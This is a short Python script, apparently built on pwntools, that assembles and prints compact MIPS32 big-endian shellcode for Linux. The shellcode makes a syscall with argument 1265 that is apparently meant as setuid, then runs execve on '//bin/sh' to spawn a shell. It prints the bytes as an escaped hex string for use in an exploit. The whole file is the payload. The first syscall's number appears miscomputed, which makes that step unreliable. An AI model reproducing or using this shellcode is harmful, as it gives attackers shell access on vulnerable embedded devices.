#!/usr/bin/env python3

from pwn import *

# Thank you
# https://fireshellsecurity.team/writing-a-shellcode-for-mips32/

context.update(arch='mips', os='linux', bits=32, endian='big')

# The shellcode from asm(shellcraft.sh()) is too large (124 bytes)
# shellcode = asm(shellcraft.sh())  

shellcode = asm('''
  li $a0, 1265
  xori $v0, $zero, 0x1818
  addiu $v0, $v0, -0x1801
  syscall 0x040405
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  addiu $a0, $sp, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
''')

# Print shellcode in hexadecimal
print(''.join(['\\x%02x' % b for b in shellcode]))


